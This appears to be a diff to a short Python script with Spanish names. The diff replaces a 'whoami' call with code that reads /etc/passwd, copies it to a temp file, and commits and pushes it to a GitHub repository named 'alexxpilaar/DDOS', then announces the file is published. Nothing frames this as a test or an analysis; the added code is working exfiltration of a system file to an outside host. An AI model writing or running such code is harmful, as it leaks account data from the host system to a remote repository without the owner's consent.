@@ -1,15 +1,25 @@
-
 import subprocess
 
 def run():
     
-    comando = "whoami"
+    archivo = '/etc/passwd'
+    mensaje_commit = 'archivo passwd en GitHub'
+
     
-    
-    resultado = subprocess.run(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-    
-    
-    print("Salida estándar:", resultado.stdout)
-    print("Error estándar:", resultado.stderr)
+    with open(archivo, 'r') as file:
+        contenido = file.read()
+    repo_nombre = 'alexxpilaar/DDOS'
+    archivo_en_repo = 'passwd.txt'
+
+   
+    with open('temp.txt', 'w') as temp_file:
+        temp_file.write(contenido)
+
+    subprocess.run(['git', 'add', 'temp.txt'])
+    subprocess.run(['git', 'commit', '-m', mensaje_commit])
+    subprocess.run(['git', 'push', 'origin', 'main'])
+
+    print(f'Archivo {archivo} publicado en GitHub en el repositorio {repo_nombre}/{archivo_en_repo}')
 
 run()
+
